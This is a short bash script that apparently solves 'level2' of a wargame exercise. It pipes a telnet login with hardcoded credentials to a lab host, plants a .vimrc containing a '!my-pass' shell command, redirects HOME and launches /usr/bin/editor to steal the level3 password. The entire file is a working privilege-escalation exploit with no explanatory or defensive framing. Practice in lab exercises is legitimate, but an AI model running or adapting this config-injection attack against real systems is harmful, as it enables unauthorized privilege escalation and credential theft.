#!/bin/bash

export TERM=xterm
export LANG=en_US.UTF-8
export IP1=192.168.10.240
export PORT1=23
export USER1="level2"
export PASS1="hacker or cracker"
export CMD1="cd tmp"
export CMD2="echo '!my-pass' > .vimrc"
export CMD3="export HOME=/home/level2/tmp"
export CMD4="/usr/bin/editor"
export LOG1="level2.log"

attack() {
	sleep 2; echo "$PASS1"
	sleep 1; echo "hostname"
	sleep 1; echo "$CMD1"
	sleep 1; echo "$CMD2"
	sleep 1; echo "$CMD3"
	sleep 1; echo "$CMD4"
	sleep 1; echo "exit"
}

> $LOG1 && echo "[*] Log file created."
echo "[*] Level2 attack started. Please wait...."
attack | telnet -l $USER1 $IP1 $PORT1 >> $LOG1 2>&1

echo "[+] Level3 password cracked."
